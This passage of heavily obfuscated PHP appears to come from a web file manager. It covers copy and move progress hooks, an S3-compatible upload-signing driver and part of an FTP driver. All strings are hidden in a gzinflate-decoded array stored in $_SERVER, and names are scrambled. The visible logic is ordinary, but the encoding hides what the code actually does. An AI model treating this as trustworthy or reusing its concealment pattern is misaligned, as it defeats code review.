$this->task; $this->sourceCopyFolder = !1; Hook::bind($Ú±Ø¸ŠÁ[1800], array($this, $Ú±Ø¸ŠÁ[1801])); Hook::bind($Ú±Ø¸ŠÁ[1309], array($this, $Ú±Ø¸ŠÁ[1802])); Hook::bind($Ú±Ø¸ŠÁ[1803], array($this, $Ú±Ø¸ŠÁ[1804])); Hook::bind($Ú±Ø¸ŠÁ[677], array($this, $Ú±Ø¸ŠÁ[1805])); Hook::bind($Ú±Ø¸ŠÁ[678], array($this, $Ú±Ø¸ŠÁ[1806])); Hook::bind($Ú±Ø¸ŠÁ[684], array($this, $Ú±Ø¸ŠÁ[1807])); Hook::bind($Ú±Ø¸ŠÁ[685], array($this, $Ú±Ø¸ŠÁ[1808])); Hook::bind($Ú±Ø¸ŠÁ[680], array($this, $Ú±Ø¸ŠÁ[1809])); Hook::bind($Ú±Ø¸ŠÁ[682], array($this, $Ú±Ø¸ŠÁ[1810])); Hook::bind($Ú±Ø¸ŠÁ[646], array($this, $Ú±Ø¸ŠÁ[1811])); Hook::bind($Ú±Ø¸ŠÁ[643], array($this, $Ú±Ø¸ŠÁ[1811])); Hook::bind($Ú±Ø¸ŠÁ[648], array($this, $Ú±Ø¸ŠÁ[1811])); Hook::bind($Ú±Ø¸ŠÁ[650], array($this, $Ú±Ø¸ŠÁ[1811])); Hook::bind($Ú±Ø¸ŠÁ[652], array($this, $Ú±Ø¸ŠÁ[1811])); Hook::bind($Ú±Ø¸ŠÁ[1812], array($this, $Ú±Ø¸ŠÁ[1813])); Hook::bind($Ú±Ø¸ŠÁ[668], array($this, $Ú±Ø¸ŠÁ[1814])); $this->sourceModelCopyFlag = !1; Hook::bind($Ú±Ø¸ŠÁ[1815], array($this, $Ú±Ø¸ŠÁ[1816])); Hook::bind($Ú±Ø¸ŠÁ[1817], array($this, $Ú±Ø¸ŠÁ[1818])); Hook::bind($Ú±Ø¸ŠÁ[1819], array($this, $Ú±Ø¸ŠÁ[1820])); $ã€€¬—…[$Ú±Ø¸ŠÁ[1821]] = LNG($Ú±Ø¸ŠÁ[1822]); $ã€€¬—…[$Ú±Ø¸ŠÁ[1823]] = 0; $ã€€¬—…[$Ú±Ø¸ŠÁ[1824]] = 0; $ã€€¬—…[$Ú±Ø¸ŠÁ[1144]] = $Ú±Ø¸ŠÁ[12]; $ã€€¬—…[$Ú±Ø¸ŠÁ[1825]] = $Ú±Ø¸ŠÁ[12]; $ã€€¬—…[$Ú±Ø¸ŠÁ[1826]] = 0; $ã€€¬—…[$Ú±Ø¸ŠÁ[1827]] = 0; $ã€€¬—…[$Ú±Ø¸ŠÁ[1828]] = 0; if (!$ã€€¬—…[$Ú±Ø¸ŠÁ[1659]]) { $ã€€¬—…[$Ú±Ø¸ŠÁ[1659]] = LNG($Ú±Ø¸ŠÁ[1829]); } } protected function endAfter() { $Àşæ›ÛË =& $_SERVER[ç¦¬”œš]; Hook::unbind($Àşæ›ÛË[1800], array($this, $Àşæ›ÛË[1801])); Hook::unbind($Àşæ›ÛË[1309], array($this, $Àşæ›ÛË[1802])); Hook::unbind($Àşæ›ÛË[1803], array($this, $Àşæ›ÛË[1804])); Hook::unbind($Àşæ›ÛË[677], array($this, $Àşæ›ÛË[1805])); Hook::unbind($Àşæ›ÛË[678], array($this, $Àşæ›ÛË[1806])); Hook::unbind($Àşæ›ÛË[684], array($this, $Àşæ›ÛË[1807])); Hook::unbind($Àşæ›ÛË[685], array($this, $Àşæ›ÛË[1808])); Hook::unbind($Àşæ›ÛË[680], array($this, $Àşæ›ÛË[1809])); Hook::unbind($Àşæ›ÛË[682], array($this, $Àşæ›ÛË[1810])); Hook::unbind($Àşæ›ÛË[646], array($this, $Àşæ›ÛË[1811])); Hook::unbind($Àşæ›ÛË[643], array($this, $Àşæ›ÛË[1811])); Hook::unbind($Àşæ›ÛË[648], array($this, $Àşæ›ÛË[1811])); Hook::unbind($Àşæ›ÛË[650], array($this, $Àşæ›ÛË[1811])); Hook::unbind($Àşæ›ÛË[652], array($this, $Àşæ›ÛË[1811])); Hook::unbind($Àşæ›ÛË[1812], array($this, $Àşæ›ÛË[1813])); Hook::unbind($Àşæ›ÛË[668], array($this, $Àşæ›ÛË[1814])); Hook::unbind($Àşæ›ÛË[1815], array($this, $Àşæ›ÛË[1816])); Hook::unbind($Àşæ›ÛË[1817], array($this, $Àşæ›ÛË[1818])); Hook::unbind($Àşæ›ÛË[1819], array($this, $Àşæ›ÛË[1820])); } public function copyMoveStart($¨‚™ÌÃ, $ëş£¨‰£, $ã­²‡Ç, $¬À øÓ½) { $Ï½ÖÙÏ÷ =& $_SERVER[ç¦¬”œš]; self::log($Ï½ÖÙÏ÷[1830] . $ëş£¨‰£ . $Ï½ÖÙÏ÷[73] . $¬À øÓ½); $‚³æñ¼Ñ = rtrim(TEMP_FILES, $Ï½ÖÙÏ÷[8]); if (substr($ëş£¨‰£, 0, strlen($‚³æñ¼Ñ)) == $‚³æñ¼Ñ) { return; } if (substr($¬À øÓ½, 0, strlen($‚³æñ¼Ñ)) == $‚³æñ¼Ñ) { return; } $õâ†×—Ã =& $this->task; $õâ†×—Ã[$Ï½ÖÙÏ÷[1831]] = KodIO::transferType($¨‚™ÌÃ, $ã­²‡Ç); $this->update(); } public function updateAfter() { $º¥”’” =& $_SERVER[ç¦¬”œš]; $Ù÷ó•ó½ =& $this->task; if (!$Ù÷ó•ó½[$º¥”’”[843]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ù÷ó•ó½[$º¥”’”[1831]] == $º¥”’”[1402]) { return; } self::updateTask($Ù÷ó•ó½); } private static function updateTask(&$û¹§¼ƒÓ) { $öòƒÖã =& $_SERVER[ç¦¬”œš]; if ($û¹§¼ƒÓ[$öòƒÖã[1831]] == $öòƒÖã[1280] || $û¹§¼ƒÓ[$öòƒÖã[1831]] == $öòƒÖã[110]) { if ($û¹§¼ƒÓ[$öòƒÖã[1825]]) { $û¹§¼ƒÓ[$öòƒÖã[1828]] = $û¹§¼ƒÓ[$öòƒÖã[1827]] + $û¹§¼ƒÓ[$öòƒÖã[1824]]; } } else { if ($û¹§¼ƒÓ[$öòƒÖã[1831]] == $öòƒÖã[1403]) { if ($û¹§¼ƒÓ[$öòƒÖã[1825]] == $öòƒÖã[1280]) { $û¹§¼ƒÓ[$öòƒÖã[1828]] = $û¹§¼ƒÓ[$öòƒÖã[1827]] + $û¹§¼ƒÓ[$öòƒÖã[1824]] * 0.5; } else { if ($û¹§¼ƒÓ[$öòƒÖã[1825]] == $öòƒÖã[110]) { $û¹§¼ƒÓ[$öòƒÖã[1828]] = $û¹§¼ƒÓ[$öòƒÖã[1827]] + $û¹§¼ƒÓ[$öòƒÖã[1823]] * 0.5 + $û¹§¼ƒÓ[$öòƒÖã[1824]] * 0.5; } } } } $û¹§¼ƒÓ[$öòƒÖã[1772]] = $û¹§¼ƒÓ[$öòƒÖã[1828]] / $û¹§¼ƒÓ[$öòƒÖã[843]]; if ($û¹§¼ƒÓ[$öòƒÖã[1772]] > 0) { $ô•³Ñ€ = timeFloat() - $û¹§¼ƒÓ[$öòƒÖã[1774]] - $û¹§¼ƒÓ[$öòƒÖã[1777]]; $û¹§¼ƒÓ[$öòƒÖã[1778]] = $ô•³Ñ€ * (1 - $û¹§¼ƒÓ[$öòƒÖã[1772]]) / $û¹§¼ƒÓ[$öòƒÖã[1772]]; } } public function addPath($‚ä·¢ÍÇ) { $Ì’ÉºÓã =& $_SERVER[ç¦¬”œš]; if (!$‚ä·¢ÍÇ) { return; } $±¼ü®…® =& $this->task; $¹ä¬ÚÚ“ = IO::infoWithChildren($‚ä·¢ÍÇ); $¸ÚÊ›çÅ = $±¼ü®…®[$Ì’ÉºÓã[1832]] ? $±¼ü®…®[$Ì’ÉºÓã[1832]][$Ì’ÉºÓã[1833]] : 0; $±¼ü®…®[$Ì’ÉºÓã[1832]] = array($Ì’ÉºÓã[1833] => $¸ÚÊ›çÅ + 1, $Ì’ÉºÓã[503] => $¹ä¬ÚÚ“[$Ì’ÉºÓã[32]], $Ì’ÉºÓã[87] => $¹ä¬ÚÚ“[$Ì’ÉºÓã[87]], $Ì’ÉºÓã[591] => $¹ä¬ÚÚ“[$Ì’ÉºÓã[591]] ? $¹ä¬ÚÚ“[$Ì’ÉºÓã[591]] : $¹ä¬ÚÚ“[$Ì’ÉºÓã[87]]); if ($¹ä¬ÚÚ“[$Ì’ÉºÓã[33]] == $Ì’ÉºÓã[230]) { $±¼ü®…®[$Ì’ÉºÓã[1142]] += 1; } else { $±¼ü®…®[$Ì’ÉºÓã[1142]] += $¹ä¬ÚÚ“[$Ì’ÉºÓã[82]][$Ì’ÉºÓã[80]]; if ($¹ä¬ÚÚ“[$Ì’ÉºÓã[193]]) { $±¼ü®…®[$Ì’ÉºÓã[1142]] += $¹ä¬ÚÚ“[$Ì’ÉºÓã[82]][$Ì’ÉºÓã[81]] + 1; } } $±¼ü®…®[$Ì’ÉºÓã[843]] += $¹ä¬ÚÚ“[$Ì’ÉºÓã[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÙóÃœ¦Ù) { } public function sourceAddHashEnd($öñ“ªÆ) { } public function sourceAddFileStart($õ®¢«¾‚) { $£¢ğØë¢ =& $_SERVER[ç¦¬”œš]; $í‹î±’™ =& $this->task; $í‹î±’™[$£¢ğØë¢[1823]] = $õ®¢«¾‚[$£¢ğØë¢[79]]; $í‹î±’™[$£¢ğØë¢[1821]] = $õ®¢«¾‚[$£¢ğØë¢[32]]; $í‹î±’™[$£¢ğØë¢[1144]] = $õ®¢«¾‚[$£¢ğØë¢[32]]; $í‹î±’™[$£¢ğØë¢[1834]] = $õ®¢«¾‚[$£¢ğØë¢[87]]; $this->update(); } public function sourceAddFileEnd($¢–ÆÒÎØ) { $¶­§âÔÉ =& $_SERVER[ç¦¬”œš]; $ˆã±±Ã =& $this->task; $ˆã±±Ã[$¶­§âÔÉ[1828]] += $¢–ÆÒÎØ[$¶­§âÔÉ[79]]; $ˆã±±Ã[$¶­§âÔÉ[1834]] = $¢–ÆÒÎØ[$¶­§âÔÉ[87]]; $this->update(1); } public function copyFileStart($Ï²–ã, $ı˜Áƒ, $ïšš‘‚Å, $ãºÍÚ”Š, $˜ÁëŸ¬¢, $ÚÉôü™Ù) { $é¨İÂÅ =& $_SERVER[ç¦¬”œš]; $¿½ÈĞ»§ = $˜ÁëŸ¬¢; if ($¿½ÈĞ»§ == $GLOBALS[$é¨İÂÅ[1835]]) { $¿½ÈĞ»§ = $GLOBALS[$é¨İÂÅ[1836]]; } $GLOBALS[$é¨İÂÅ[1836]] = $˜ÁëŸ¬¢; $GLOBALS[$é¨İÂÅ[1835]] = $ÚÉôü™Ù; $¹…‚°´” =& $this->task; $¹…‚°´”[$é¨İÂÅ[1821]] = $¿½ÈĞ»§; $¹…‚°´”[$é¨İÂÅ[1823]] = (int) $Ï²–ã->size($ı˜Áƒ); $¹…‚°´”[$é¨İÂÅ[1824]] = 0; $¹…‚°´”[$é¨İÂÅ[1144]] = $é¨İÂÅ[12]; $¹…‚°´”[$é¨İÂÅ[1825]] = $é¨İÂÅ[12]; $¹…‚°´”[$é¨İÂÅ[1826]] = 0; $üÉÒ…Ô = $¹…‚°´”[$é¨İÂÅ[1823]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¹…‚°´”[$é¨İÂÅ[484]] . $é¨İÂÅ[1837]); if ($üÉÒ…Ô && file_exists(get_path_father($ãºÍÚ”Š))) { Cache::set($¹…‚°´”[$é¨İÂÅ[484]] . $é¨İÂÅ[1837], $ãºÍÚ”Š); $¹…‚°´”[$é¨İÂÅ[1794]] = array($é¨İÂÅ[1838], $é¨İÂÅ[1839]); } $this->update(0, $üÉÒ…Ô); } public static function updateCopyLocalFileSize($Çˆ”¯ƒ) { $ ö•°†Ì =& $_SERVER[ç¦¬”œš]; $×à­Šø´ = Cache::get($Çˆ”¯ƒ[$ ö•°†Ì[484]] . $ ö•°†Ì[1837]); if (!$×à­Šø´ || !file_exists($×à­Šø´)) { return $Çˆ”¯ƒ; } $Çˆ”¯ƒ[$ ö•°†Ì[1824]] = @filesize($×à­Šø´); $Çˆ”¯ƒ[$ ö•°†Ì[1828]] += $Çˆ”¯ƒ[$ ö•°†Ì[1824]]; self::updateTask($Çˆ”¯ƒ); return $Çˆ”¯ƒ; } public function copyFileEnd($Ùğ½Àµ½, $İŸì…‘°, $¤»ÙèÜØ, $Ä£¢Ø£×, $Ï—¤¡š¶, $÷“÷§ä) { $Äù¨²š‚ =& $_SERVER[ç¦¬”œš]; $ÎÔú¦ã¯ =& $this->task; $ÎÔú¦ã¯[$Äù¨²š‚[1824]] = $ÎÔú¦ã¯[$Äù¨²š‚[1823]]; $ÎÔú¦ã¯[$Äù¨²š‚[1825]] = $Äù¨²š‚[12]; unset($ÎÔú¦ã¯[$Äù¨²š‚[1794]]); if ($Ï—¤¡š¶ == $ÎÔú¦ã¯[$Äù¨²š‚[1821]]) { $ÎÔú¦ã¯[$Äù¨²š‚[1827]] += $ÎÔú¦ã¯[$Äù¨²š‚[1823]]; $ÎÔú¦ã¯[$Äù¨²š‚[1828]] = $ÎÔú¦ã¯[$Äù¨²š‚[1827]]; $µ Œ—½ = 1; if (isset($ÎÔú¦ã¯[$Äù¨²š‚[1834]]) && $ÎÔú¦ã¯[$Äù¨²š‚[1834]] == $İŸì…‘°) { $µ Œ—½ = 0; } $this->update($µ Œ—½); } else { $this->update(); $ÎÔú¦ã¯[$Äù¨²š‚[1824]] = 0; } Cache::remove($ÎÔú¦ã¯[$Äù¨²š‚[484]] . $Äù¨²š‚[1837]); self::log($Äù¨²š‚[1840] . $İŸì…‘° . $Äù¨²š‚[73] . $Ä£¢Ø£× . $Äù¨²š‚[262] . $Ï—¤¡š¶ . $Äù¨²š‚[1841] . $ÎÔú¦ã¯[$Äù¨²š‚[1821]]); } public function updateFileEnd($êé¶‘Èá, $à­ĞÆ­¾) { $ŠÌ×Óü =& $_SERVER[ç¦¬”œš]; $óÑµáäü =& $this->task; $óÑµáäü[$ŠÌ×Óü[1821]] = $êé¶‘Èá; $óÑµáäü[$ŠÌ×Óü[1823]] = $à­ĞÆ­¾; $óÑµáäü[$ŠÌ×Óü[1827]] += $à­ĞÆ­¾; $óÑµáäü[$ŠÌ×Óü[1828]] = $óÑµáäü[$ŠÌ×Óü[1827]]; $this->update(1); self::log($ŠÌ×Óü[1842] . $êé¶‘Èá); } public function sourceModelCopy($Êí‹‘À´) { $…Ä½Øµù =& $_SERVER[ç¦¬”œš]; $õ´ìŠø¾ = $Êí‹‘À´[0]; $Ÿşèé‡– = $Êí‹‘À´[1]; $”²ÕÍÒÂ =& $this->task; $this->sourceModelCopyFlag = !0; $˜ÁíÍíè = 0; switch ($õ´ìŠø¾) { case $…Ä½Øµù[644]: $˜ÁíÍíè = 1; break; case $…Ä½Øµù[647]: $”²ÕÍÒÂ[$…Ä½Øµù[1821]] = $Ÿşèé‡–[$…Ä½Øµù[32]]; break; case $…Ä½Øµù[649]: $˜ÁíÍíè = intval($Êí‹‘À´[$…Ä½Øµù[456]] * 0.4); break; case $…Ä½Øµù[651]: $˜ÁíÍíè = intval($Êí‹‘À´[$…Ä½Øµù[456]] * 0.2); break; case $…Ä½Øµù[653]: $˜ÁíÍíè = intval($Êí‹‘À´[$…Ä½Øµù[456]] * 0.4); break; } $this->update($˜ÁíÍíè); $this->sourceModelCopyFlag = !1; } public function sourceRemove($–Éøúõ³, $üõúÅ’Æ) { $ìäáÊù¢ =& $_SERVER[ç¦¬”œš]; $this->sourceModelCopyFlag = !0; $©ÊÕÔ•“ = 1; if (isset($–Éøúõ³[$ìäáÊù¢[82]])) { $©ÊÕÔ•“ = $–Éøúõ³[$ìäáÊù¢[82]][$ìäáÊù¢[80]]; $©ÊÕÔ•“ = $©ÊÕÔ•“ + $–Éøúõ³[$ìäáÊù¢[82]][$ìäáÊù¢[81]] + 1; } $this->update($©ÊÕÔ•“); $this->sourceModelCopyFlag = !1; } public function sourceMove($°İ§û×Û) { $this->sourceRemove($°İ§û×Û, !1); } public function curlProgress($º‡œşã•, $şµŞÑ›Ğ, $º´¼øƒ¾, $™Œé»¾×, $ª¹ÀğÈû) { $É°Û½ « =& $_SERVER[ç¦¬”œš]; $µ‘ö‹ÁÇ =& $this->task; if ($ª¹ÀğÈû > 0) { $µ‘ö‹ÁÇ[$É°Û½ «[1144]] = $É°Û½ «[1843]; $µ‘ö‹ÁÇ[$É°Û½ «[1825]] = $É°Û½ «[110]; if ($µ‘ö‹ÁÇ[$É°Û½ «[1823]]) { $µ‘ö‹ÁÇ[$É°Û½ «[1824]] = $ª¹ÀğÈû; } if ($µ‘ö‹ÁÇ[$É°Û½ «[1826]]) { $µ‘ö‹ÁÇ[$É°Û½ «[1824]] = $ª¹ÀğÈû + $µ‘ö‹ÁÇ[$É°Û½ «[1826]]; } } else { if ($º´¼øƒ¾ > 0) { if ($µ‘ö‹ÁÇ[$É°Û½ «[1823]] == $şµŞÑ›Ğ) { $µ‘ö‹ÁÇ[$É°Û½ «[1824]] = $º´¼øƒ¾; $µ‘ö‹ÁÇ[$É°Û½ «[1144]] = $É°Û½ «[1844]; $µ‘ö‹ÁÇ[$É°Û½ «[1825]] = $É°Û½ «[1280]; } } } $this->update(); } public function curlProgressStart($º­‘ëá ) { } public function curlProgressEnd($šİ¿á­î) { $”¹Óê =& $_SERVER[ç¦¬”œš]; $Ù‡®æÍª =& $this->task; $”µÇ„ã = curl_getinfo($šİ¿á­î); $¢˜êÊº = $”µÇ„ã[$”¹Óê[1845]]; if ($¢˜êÊº == -1) { $¢˜êÊº = $”µÇ„ã[$”¹Óê[1846]]; } if ($Ù‡®æÍª[$”¹Óê[1825]] == $”¹Óê[110] && $¢˜êÊº) { $Ù‡®æÍª[$”¹Óê[1826]] += $¢˜êÊº; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÒóÃ×Û± =& $_SERVER[ç¦¬”œš]; $¦ì²”½± =& $this->task; $¦ì²”½±[$ÒóÃ×Û±[1847]] = 1; Hook::bind($ÒóÃ×Û±[1815], array($this, $ÒóÃ×Û±[1848])); Hook::bind($ÒóÃ×Û±[1817], array($this, $ÒóÃ×Û±[1849])); Hook::bind($ÒóÃ×Û±[1819], array($this, $ÒóÃ×Û±[1850])); } protected function endAfter() { $–œ‘§ïı =& $_SERVER[ç¦¬”œš]; Hook::unbind($–œ‘§ïı[1815], array($this, $–œ‘§ïı[1848])); Hook::unbind($–œ‘§ïı[1817], array($this, $–œ‘§ïı[1849])); Hook::unbind($–œ‘§ïı[1819], array($this, $–œ‘§ïı[1850])); } public function progressStart($Ö¬’åï) { $Ù¯¡Ê¹æ =& $_SERVER[ç¦¬”œš]; $«¾ÀëğØ = curl_getinfo($Ö¬’åï); self::log($Ù¯¡Ê¹æ[1851] . $«¾ÀëğØ[$Ù¯¡Ê¹æ[383]]); self::valueSet($this->task[$Ù¯¡Ê¹æ[484]], $this->task); } public function progressEnd($———Û·û) { $‹¬İÚ‘ =& $_SERVER[ç¦¬”œš]; self::log($‹¬İÚ‘[1852] . $this->task[$‹¬İÚ‘[484]]); $this->end(); } public function progress($µÓ÷–õ, $àã½¥, $¸ ²™¤«, $Ğö×Şü¤, $ÇÚ’»²Æ) { $üüïÕ¬² =& $_SERVER[ç¦¬”œš]; $îûš£¸× =& $this->task; if ($ÇÚ’»²Æ > 0) { $îûš£¸×[$üüïÕ¬²[1142]] = $îûš£¸×[$üüïÕ¬²[1142]] == 0 ? $Ğö×Şü¤ : $îûš£¸×[$üüïÕ¬²[1142]]; $îûš£¸×[$üüïÕ¬²[1771]] = $ÇÚ’»²Æ; } else { if ($¸ ²™¤« > 0) { $îûš£¸×[$üüïÕ¬²[1142]] = $îûš£¸×[$üüïÕ¬²[1142]] == 0 ? $àã½¥ : $îûš£¸×[$üüïÕ¬²[1142]]; $îûš£¸×[$üüïÕ¬²[1771]] = $¸ ²™¤«; } } $this->update(); self::log("\160\162\x6f\147\x72\145\163\163\x48\164\164\x70\x3a\x64\157\x77\156\x3a{$¸ ²™¤«}\57{$àã½¥}\73\x20\x75\160\154\x6f\x61\x64\x3a{$ÇÚ’»²Æ}\x2f{$Ğö×Şü¤}\x3b"); } } goto F£ùöÓì–Ş; Dœ‰¬ƒ ®¬: define($_SERVER[ç¦¬”œš][0], $_SERVER[ç¦¬”œš][1]); $_SERVER[Æ‡¶Û«ï] = explode($_SERVER[ç¦¬”œš][2], gzinflate(substr($_SERVER[ç¦¬”œš][3], 10, -8))); function binCheckEq($˜ı‘áû, $¤‰ĞÚ°Ö) { return $˜ı‘áû == $¤‰ĞÚ°Ö; } goto aºÓµÏ†ïô; b©Ÿã™‚î: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($àôøùÍØ) { parent::__construct($àôøùÍØ); $this->setSignVersion($_SERVER[ç¦¬”œš][247]); } public function uploadFormData($¢Ê„ã, $Ê³Ø¾Œ° = 3600) { $ù–ÈÀÅ© =& $_SERVER[ç¦¬”œš]; $ÔÔ ±ğ© = $ù–ÈÀÅ©[229]; $òŞ‘âçÓ = $ù–ÈÀÅ©[270]; $×¡£¶³µ = $ù–ÈÀÅ©[62]; $Ûœáóù½ = gmdate($ù–ÈÀÅ©[271]); $œ÷¢Ş¬Ó = gmdate($ù–ÈÀÅ©[272]); $şÀø¯Ù² = $ù–ÈÀÅ©[273]; $»‚‚ó„¬ = $Ê³Ø¾Œ° . $ù–ÈÀÅ©[12]; $Ö×ø“ÁŸ = $ù–ÈÀÅ©[274]; $ÓŒ¼ÉŸ = array($this->accessKey, $œ÷¢Ş¬Ó, $this->region, $×¡£¶³µ, $şÀø¯Ù²); $¤çÃ’·© = implode($ù–ÈÀÅ©[8], $ÓŒ¼ÉŸ); $ÖÊÙÏÈ– = array($ù–ÈÀÅ©[275] => gmdate($ù–ÈÀÅ©[299], strtotime($ù–ÈÀÅ©[277])), $ù–ÈÀÅ©[278] => array(array($ù–ÈÀÅ©[279] => $this->bucket), array($ù–ÈÀÅ©[280] => $ÔÔ ±ğ©), array($ù–ÈÀÅ©[281], $ù–ÈÀÅ©[282], $ù–ÈÀÅ©[12]), array($ù–ÈÀÅ©[281], $ù–ÈÀÅ©[283], $ù–ÈÀÅ©[12]), array($ù–ÈÀÅ©[281], $ù–ÈÀÅ©[284], $ù–ÈÀÅ©[12]), array($ù–ÈÀÅ©[285] => $Ö×ø“ÁŸ), array($ù–ÈÀÅ©[286] => $¤çÃ’·©), array($ù–ÈÀÅ©[287] => $òŞ‘âçÓ), array($ù–ÈÀÅ©[288] => $Ûœáóù½), array($ù–ÈÀÅ©[289] => $»‚‚ó„¬))); $Ü¯ğõ÷ = base64_encode(json_encode($ÖÊÙÏÈ–)); $€ÖŸ€À = hash_hmac($ù–ÈÀÅ©[290], $œ÷¢Ş¬Ó, $ù–ÈÀÅ©[291] . $this->secret, !0); $Ò“ª–È = hash_hmac($ù–ÈÀÅ©[290], $this->region, $€ÖŸ€À, !0); $„Ê•”êÅ = hash_hmac($ù–ÈÀÅ©[290], $×¡£¶³µ, $Ò“ª–È, !0); $İ¡ÚÏĞÒ = hash_hmac($ù–ÈÀÅ©[290], $şÀø¯Ù², $„Ê•”êÅ, !0); $Ÿùêµ‰Ú = hash_hmac($ù–ÈÀÅ©[290], $Ü¯ğõ÷, $İ¡ÚÏĞÒ); $‚›Ö™± = array($ù–ÈÀÅ©[246] => $ù–ÈÀÅ©[12], $ù–ÈÀÅ©[292] => $ù–ÈÀÅ©[12], $ù–ÈÀÅ©[280] => $ÔÔ ±ğ©, $ù–ÈÀÅ©[285] => $Ö×ø“ÁŸ, $ù–ÈÀÅ©[293] => $Ü¯ğõ÷, $ù–ÈÀÅ©[294] => $¤çÃ’·©, $ù–ÈÀÅ©[295] => $òŞ‘âçÓ, $ù–ÈÀÅ©[296] => $Ûœáóù½, $ù–ÈÀÅ©[297] => $»‚‚ó„¬, $ù–ÈÀÅ©[298] => $Ÿùêµ‰Ú, $ù–ÈÀÅ©[208] => $this->getHost()); return $‚›Ö™±; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($Ï¼ı–Šê) { parent::__construct(); if (count($Ï¼ı–Šê) > 0) { $this->_init($Ï¼ı–Šê); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¢Ù²§òã) { $•“‹íÃÍ =& $_SERVER[ç¦¬”œš]; global $config; $this->appCharset = $config[$•“‹íÃÍ[1437]]; $this->systemCharset = $config[$•“‹íÃÍ[1438]]; if (isset($¢Ù²§òã[$•“‹íÃÍ[1439]]) && $¢Ù²§òã[$•“‹íÃÍ[1439]]) { $this->systemCharset = $¢Ù²§òã[$•“‹íÃÍ[1439]]; } } public function iconvApp($İÖş·ú‘) { return $this->iconvTo($İÖş·ú‘, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ô åçÎõ) { return $this->iconvTo($Ô åçÎõ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ËÊÊãÛª) { $âüœùŸ =& $_SERVER[ç¦¬”œš]; $¤ë²…ûÒ = $this->iconvApp($this->pathBase); $ËÊÊãÛª = $this->iconvApp($ËÊÊãÛª); if (substr($¤ë²…ûÒ, 0, 2) == $âüœùŸ[1411]) { $¤ë²…ûÒ = BASIC_PATH . substr($¤ë²…ûÒ, 2); } if (substr($ËÊÊãÛª, 0, 2) == $âüœùŸ[1411]) { $ËÊÊãÛª = BASIC_PATH . substr($ËÊÊãÛª, 2); } $¤ë²…ûÒ = KodIO::clear($¤ë²…ûÒ); $ËÊÊãÛª = KodIO::clear($ËÊÊãÛª); $ËÊÊãÛª = substr($ËÊÊãÛª, strlen($¤ë²…ûÒ)); if (empty($this->pathDriver)) { return $ËÊÊãÛª; } return $this->pathDriver . $âüœùŸ[8] . ltrim($ËÊÊãÛª, $âüœùŸ[8]); } private function _init($ğ„®éÀß = array()) { $îÈçÅ =& $_SERVER[ç¦¬”œš]; if (!function_exists($îÈçÅ[1440])) { throw new Exception(LNG($îÈçÅ[1441])); } $this->config = $ğ„®éÀß; $this->charsetReset($ğ„®éÀß); foreach ($ğ„®éÀß as $¾ÈÖÍ’È => $¼şËö) { if (isset($this->{$¾ÈÖÍ’È})) { $this->{$¾ÈÖÍ’È} = $¼şËö; } } return $this->_login($ğ„®éÀß); } private function _login($†“û¼¹) { $îäîù×ü =& $_SERVER[ç¦¬”œš]; static $»“µéù = array(); $ï—Øõ±Á = md5(json_encode($†“û¼¹)); if (isset($»“µéù[$ï—Øõ±Á])) { foreach ($»“µéù[$ï—Øõ±Á] as $‘úªğ’è => $¡ÊßõôË) { $this->{$‘úªğ’è} = $¡ÊßõôË; } return !0; } $Í«Á²° = parse_url(trim($this->server, $îäîù×ü[8])); $this->host = $Í«Á²°[$îäîù×ü[208]]; $‡Ã¹û±¬ = isset($Í«Á²°[$îäîù×ü[207]]) && $Í«Á²°[$îäîù×ü[207]] == $îäîù×ü[1442] ? !0 : !1; $this->scheme = $‡Ã¹û±¬ ? $îäîù×ü[1443] : $îäîù×ü[1444]; $this->port = isset($Í«Á²°[$îäîù×ü[209]]) ? $Í«Á²°[$îäîù×ü[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($îäîù×ü[1445]) . $this->host . $îäîù×ü[4] . $this->port, !0); return !1; } $®æ­“§ó = @ftp_login($this->connect, $this->username, $this->userpass); if (!$®æ­“§ó) { $this->writeLog(LNG($îäîù×ü[1446]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $³²Ä¯Í° = $this->pasv == $îäîù×ü[91] ? !0 : !1; @ftp_pasv($this->connect, $³²Ä¯Í°); $»“µéù[$ï—Øõ±Á] = array($îäîù×ü[1447] => $this->connect, $îäîù×ü[208] => $this->host, $îäîù×ü[207] => $this->scheme, $îäîù×ü[209] => $this->port); return $®æ­“§ó; } private function _isconn($¶½­©•µ = true) { if (is_resource($this->connect)) { return !0; } if (!$¶½­©•µ) { return !1; } return $this->_login($this->config); } public function mkfile($Ÿ­÷‘Ò•, $ø¢ÆÒã— = '', $Î×ùØ‚¾ = REPEAT_RENAME) { if ($this->setContent($Ÿ­÷‘Ò•, $ø¢ÆÒã—)) { return $this->getPathOuter($Ÿ­÷‘Ò•); } $this->writeLog(LNG($_SERVER[ç¦¬”œš][1448]), !0); return !1; } public function mkdir($ğÕî˜À, $…‡ª¤Ù´ = REPEAT_SKIP) { $£ª’Àş” =& $_SERVER[ç¦¬”œš]; if (!$ğÕî˜À || $ğÕî˜À == $£ª’Àş”[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ğÕî˜À = $this->iconvSystem($ğÕî˜À); if ($this->_isFolder($ğÕî˜À) || @ftp_mkdir($this->connect, $ğÕî˜À)) { return $this->getPathOuter($ğÕî˜À); } if (!$this->mkdir($this->pathFather($ğÕî˜À))) { return !1; } if ($ğÕî˜À = @ftp_mkdir($this->connect, $ğÕî˜À)) { return $this->getPathOuter($ğÕî˜À); } $this->writeLog(__FUNCTION__ . $£ª’Àş”[1449], !0); return !1; } public function copyFile($µÛ‹ˆ„, $üê£¥º¤) { if (!$this->_isconn()) { return !1; } $ñ«„ªşş = $this->pathThis($this->iconvSystem($µÛ‹ˆ„)); $¨±ÉäÖà = $this->tempFile($ñ«„ªşş); $‹µ‹øéµ = $this->iconvApp($¨±ÉäÖà); 